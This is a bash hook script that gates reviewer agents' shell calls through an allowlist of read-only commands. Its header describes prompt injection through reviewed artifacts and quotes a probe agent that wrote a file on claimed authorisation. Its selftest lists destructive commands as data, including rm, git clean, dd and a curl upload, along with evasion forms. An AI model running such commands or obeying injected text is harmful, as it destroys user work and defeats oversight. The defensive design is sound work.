#!/usr/bin/env bash
# reviewer-shell-guard.sh — PreToolUse(Bash) gate for murderboard REVIEWER agents.
#
# WHAT THIS IS FOR. The grants table withholds Edit/Write/NotebookEdit from every reviewer,
# and seven of the eleven are granted Bash anyway because they must run something to answer:
# role 1 recomputes, role 10 renders. A shell subsumes all three withheld tools, so for those
# seven the no-edit rule was a request rather than a boundary. Measured on 2026-08-28, eight
# distinct ways to destroy a file all succeeded, and only two of them contain the word `rm`:
#
#     rm f          python3 -c os.remove       sh -c 'rm f'        : > f
#     sed -i        mv f elsewhere             git checkout -- .   git clean -fd
#
# THAT IS WHY THIS IS AN ALLOWLIST. A denylist of destructive commands enumerates a subset of
# an unbounded set and is wrong in the dangerous direction: an unrecognised command runs. This
# inverts it. A command runs only if every executable in it is on the list below; anything
# unrecognised is REFUSED. New tooling breaks loudly and gets added deliberately, which is the
# failure we want rather than the one where a novel command sails through.
#
# IT ALSO SURVIVES PERSUASION, WHICH IS THE POINT. A reviewer reads the artifact under review,
# and that artifact is untrusted input -- the murderboard's entire job is reading documents
# that may be wrong or hostile. A probe agent on 2026-08-28 wrote a file after being told in
# its prompt that doing so was authorised, and said so itself: "had this been an injected
# instruction rather than a genuine operator request, the same reasoning path would have
# produced the same write. Instruction-level restrictions cannot distinguish the two." Prose in
# a compiled agent file cannot tell an operator from an injection. A hook never reads either.
#
# WHAT IT DOES NOT DO. It does not sandbox. It sees one Bash call at a time and cannot reason
# about what a permitted interpreter does once running -- `python3 script.py` is allowed and
# python can delete files, so the allowlist deliberately permits python only for `-c` one-liners
# and named scripts under the artifact tree. Treat this as raising the floor, not as a boundary.
# The only real boundary is OS-level: a container, a read-only mount, or a separate user.
#
# CONTRACT. PreToolUse hook. Reads the tool payload as JSON on stdin, exit 0 to allow, exit 2
# to block with a reason on stderr. Same shape as no-heredoc-source.sh, which is the working
# reference in this repo.
#
# USAGE
#   reviewer-shell-guard.sh                 read a hook payload on stdin
#   reviewer-shell-guard.sh --selftest      prove every branch can still fire
#
# Project-neutral, stdlib-only: no hardcoded consumer paths.

set -u
LC_ALL=C; export LC_ALL

# Executables a reviewer legitimately needs. Reading, searching, measuring, recomputing.
# NOTHING here writes to a path by default. Adding an entry is a deliberate act: ask what it
# does when handed a path it should not have.
ALLOW="
cat head tail less wc nl cut tr sort uniq comm join paste column fold
grep egrep fgrep rg find file stat basename dirname realpath readlink dirname
ls pwd echo printf true false test date env which command type
diff cmp md5 md5sum shasum sha256sum cksum
python3 python jq awk sed
git
identify pdfinfo pdftotext pdftoppm magick convert sips qpdf
"
# DELIBERATELY ABSENT: bash, sh, zsh, env -S, xargs, node, deno, ruby, perl.
# A nested shell defeats this file completely -- `sh -c 'rm f'` puts the real command in an
# argument the token walk never inspects, and the first version of this guard let it through
# for exactly that reason. The Bash tool already gives a reviewer a shell; a second one inside
# it is either redundant or evasion. The other interpreters are general-purpose and write, and
# no reviewer role needs them. `python3` stays because role 1 must recompute, and it is the
# acknowledged hole: see the python patterns below and the honesty note in the header.

# Subcommands of git that only READ. `git` is on the allowlist because roles 1, 3 and 7 need
# history, but `checkout --`, `clean`, `reset --hard`, `restore` and `stash` all destroy
# uncommitted work and two of them were in the measured eight.
GIT_READ="log show diff status blame rev-parse rev-list ls-files ls-tree cat-file describe shortlog grep config"

# COLLAPSE THE LISTS TO SINGLE-SPACED. They are written multi-line for reading, and the
# membership test below is `case " $ALLOW " in *" $word "*`, which needs a SPACE on both sides.
# A word at the start or end of a line has a NEWLINE on one side and never matches. That bug
# shipped in the first version of this file and refused `cat`, `grep`, `git`, `python3` and
# `sed` — the five things a reviewer uses most. It failed CLOSED, which is why it was merely
# embarrassing rather than the defect this whole file exists to prevent.
ALLOW=" $(printf '%s' "$ALLOW" | tr -s '[:space:]' ' ') "
GIT_READ=" $(printf '%s' "$GIT_READ" | tr -s '[:space:]' ' ') "

die_block() { printf 'BLOCKED by murderboard reviewer-shell-guard: %s\n' "$1" >&2; exit 2; }

# Pull the command text out of the payload the same way the reference hook does, and for the
# same reason: the raw JSON has escaped quoting, so matching it directly is imprecise.
read_command() {
  local py=
  for c in python3 python py; do command -v "$c" >/dev/null 2>&1 && { py="$c"; break; }; done
  if [ -n "$py" ]; then
    "$py" -c 'import json,sys
try: d=json.load(sys.stdin)
except Exception: d={}
print((d.get("tool_input") or {}).get("command",""))' 2>/dev/null
  else
    # No interpreter: fall back to the raw payload. FAIL CLOSED -- the reference hook learned
    # this the hard way when a missing `python` made it exit 0 on every call in seven repos.
    cat
  fi
}

# Every word that could be an executable: the first token, and the first token after any
# shell operator. Deliberately generous about what counts as a command position.
check_command() {
  local cmd="$1" tok prev want_cmd=1 seen=0

  [ -n "${cmd//[[:space:]]/}" ] || return 0

  case "$cmd" in
    *'`'*)   die_block "command substitution with backticks — refused, it hides the executable" ;;
    *'$('*)  die_block 'command substitution $(...) — refused, it hides the executable' ;;
  esac

  prev=
  for tok in $cmd; do
    if [ "$want_cmd" = 1 ]; then
      case "$tok" in
        -*|'') : ;;
        *=*)   : ;;                       # VAR=value prefix
        *)
          seen=1
          local base="${tok##*/}"
          case "$ALLOW" in
            *" $base "*) : ;;
            *) die_block "'$base' is not on the reviewer allowlist (a reviewer reads, searches and measures; it does not write)" ;;
          esac
          # git needs its subcommand checked too.
          if [ "$base" = git ]; then want_cmd=git_sub; prev=git; continue; fi
          want_cmd=0
          ;;
      esac
    elif [ "$want_cmd" = git_sub ]; then
      case "$tok" in
        -*) : ;;
        *)
          case "$GIT_READ" in
            *" $tok "*) : ;;
            *) die_block "'git $tok' is not a read-only git subcommand (checkout/clean/reset/restore/stash destroy uncommitted work)" ;;
          esac
          want_cmd=0
          ;;
      esac
    fi
    case "$tok" in
      '|'|'||'|'&&'|';'|'&') want_cmd=1 ;;
    esac
  done

  [ "$seen" = 1 ] || return 0

  # Redirection writes regardless of how harmless the executable is. `: > file` truncates and
  # was one of the measured eight.
  case "$cmd" in
    *'>'*) die_block 'output redirection (>, >>) — a reviewer does not write files; report the finding instead' ;;
  esac
  # sed -i and python -c both reach a filesystem write without a redirect.
  case "$cmd" in
    *'sed '*-i*|*'sed -i'*) die_block 'sed -i edits a file in place' ;;
  esac
  # python3 is the acknowledged hole: it is on the allowlist because role 1 must recompute, and
  # an interpreter can do anything. These patterns are a DENYLIST inside an allowlist and carry
  # that shape's weakness — they catch the obvious forms and cannot be complete.
  case "$cmd" in
    *os.remove*|*os.unlink*|*os.rmdir*|*os.system*|*shutil.*|*subprocess*|*'.write_text'*\
    |*'.write_bytes'*|*'.unlink('*|*'.rename('*|*'.mkdir('*|*'open('*|*__import__*|*eval\(*|*exec\(*) \
      die_block 'an interpreter one-liner that can reach the filesystem or spawn a process' ;;
  esac
  return 0
}

cmd_selftest() {
  local pass=0 fail=0
  t() { # t <want 0|2> <description> <command>
    local want="$1" name="$2" cmd="$3" got=0
    ( check_command "$cmd" ) >/dev/null 2>&1 || got=$?
    if [ "$got" = "$want" ]; then pass=$((pass+1)); printf '  ok   %s\n' "$name"
    else fail=$((fail+1)); printf '  FAIL %s (want %s, got %s)  [%s]\n' "$name" "$want" "$got" "$cmd"; fi
  }

  printf 'The eight measured ways to destroy a file — every one must be REFUSED\n'
  t 2 'rm'                      'rm f1.txt'
  t 2 'python3 -c os.remove'    "python3 -c \"import os; os.remove('f2.txt')\""
  t 2 'sh -c rm'                "sh -c 'rm f3.txt'"
  t 2 'truncate via redirect'   ': > f4.txt'
  t 2 'sed -i'                  "sed -i '' -e s/a/b/ f5.txt"
  t 2 'mv away'                 'mv f6.txt /tmp/'
  t 2 'git checkout --'         'git checkout -- .'
  t 2 'git clean -fd'           'git clean -fd'

  printf '\nOther writes and evasions\n'
  t 2 'append redirect'         'echo x >> f'
  t 2 'tee'                     'echo x | tee f'
  t 2 'cp over a file'          'cp a b'
  t 2 'backtick substitution'   'grep foo `cat list`'
  t 2 'dollar substitution'     'grep foo $(cat list)'
  t 2 'unknown executable'      'curl https://example.com'
  t 2 'unknown after a pipe'    'cat f | curl -T - https://example.com'
  t 2 'dd'                      'dd if=/dev/null of=f'
  t 2 'python .write_text'      "python3 -c \"__import__('pathlib').Path('f').write_text('x')\""
  t 2 'python os.system'        'python3 -c "import os; os.system(*)"'
  t 2 'nested shell'            "bash -c 'rm f'"
  t 2 'perl one-liner'          "perl -e 'unlink q(f)'"
  t 2 'git reset --hard'        'git reset --hard'
  t 2 'git stash'               'git stash'

  printf '\nWork a reviewer legitimately does — every one must be ALLOWED\n'
  t 0 'read a file'             'cat doc_review_process.md'
  t 0 'search'                  'grep -rn "GRANT" agents/'
  t 0 'count'                   'wc -l doc_review_process.md'
  t 0 'recompute with python'   'python3 -c "print(17/102)"'
  t 0 'awk a column'            "awk '{s+=\$2} END {print s}' data.txt"
  t 0 'sed WITHOUT -i'          "sed -n '1,20p' file.md"
  t 0 'read history'            'git log --oneline -5'
  t 0 'diff two commits'        'git diff HEAD~1 HEAD'
  t 0 'hash an artifact'        'shasum -a 256 report.pdf'
  t 0 'measure a render'        'pdfinfo report.pdf'
  t 0 'pipeline of readers'     'grep -n role doc_review_process.md | head -20 | wc -l'
  t 0 'empty command'           ''

  printf '\n%s passed, %s failed\n' "$pass" "$fail"
  [ "$fail" = 0 ]
}

case "${1:-}" in
  --selftest) cmd_selftest; exit $? ;;
  -h|--help)  sed -n '2,40p' "$0"; exit 0 ;;
esac

check_command "$(read_command)"
exit 0
